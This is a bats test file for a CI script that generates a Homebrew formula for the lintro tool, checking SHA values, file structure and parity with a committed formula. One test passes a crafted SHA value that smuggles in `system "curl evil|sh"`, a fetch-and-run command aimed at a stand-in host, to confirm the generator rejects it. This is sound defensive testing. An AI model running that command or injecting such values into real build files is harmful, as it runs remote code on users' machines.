#!/usr/bin/env bats
# SPDX-License-Identifier: MIT
# Purpose: Tests for binary formula generation.

load "../../../helpers/common"

setup() {
	setup_temp_dir
	REPO_ROOT="$(repo_root)"
	bootstrap_test_env "$REPO_ROOT"
	SCRIPTS_DIR="$REPO_ROOT/scripts/ci"
}

teardown() {
	teardown_temp_dir
}

@test "generate-binary-formula: lintro binary structure and SHAs" {
	export SKIP_ASSET_VERIFY=1
	output_file="$TEST_TEMP_DIR/lintro.rb"
	binary_assets='{"arm64-sha":"d4f20eb9489a538355d0844d5f5485dbd6de3e9365f05a094a553f0932a7d135","x86-sha":"a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27"}'

	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$REPO_ROOT/formulas/lintro.yml" \
		--formula-key lintro \
		--version 0.64.5 \
		--output "$output_file" \
		--binary-assets "$binary_assets"

	[ "$status" -eq 0 ]
	grep -q '# typed: strict' "$output_file"
	grep -q 'class Lintro < Formula' "$output_file"
	grep -q 'version "0.64.5"' "$output_file"
	grep -q 'd4f20eb9489a538355d0844d5f5485dbd6de3e9365f05a094a553f0932a7d135' "$output_file"
	grep -q 'a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27' "$output_file"
	grep -q 'lintro-macos-arm64' "$output_file"
}

@test "generate-binary-formula: rejects non-hex sha" {
	output_file="$TEST_TEMP_DIR/lintro.rb"
	binary_assets='{"arm64-sha":"deadbeef\"\n    system \"curl evil|sh\"\n    sha256 \"x","x86-sha":"a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27"}'

	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$REPO_ROOT/formulas/lintro.yml" \
		--formula-key lintro \
		--version 0.64.5 \
		--output "$output_file" \
		--binary-assets "$binary_assets"

	[ "$status" -ne 0 ]
	[[ "$output" == *"64-character lowercase hex"* ]]
}

@test "generate-binary-formula: parity with committed lintro.rb" {
	export SKIP_ASSET_VERIFY=1
	output_file="$TEST_TEMP_DIR/lintro.rb"
	binary_assets='{"arm64-sha":"d4f20eb9489a538355d0844d5f5485dbd6de3e9365f05a094a553f0932a7d135","x86-sha":"a5c0032cde090c490b41f754c357e54f34a95dcda26794ceb81660b1f5185b27"}'

	run bash "$SCRIPTS_DIR/generate-binary-formula.sh" \
		--config "$REPO_ROOT/formulas/lintro.yml" \
		--formula-key lintro \
		--version 0.64.5 \
		--output "$output_file" \
		--binary-assets "$binary_assets"

	[ "$status" -eq 0 ]
	assert_files_equal "$REPO_ROOT/Formula/lintro.rb" "$output_file"
}
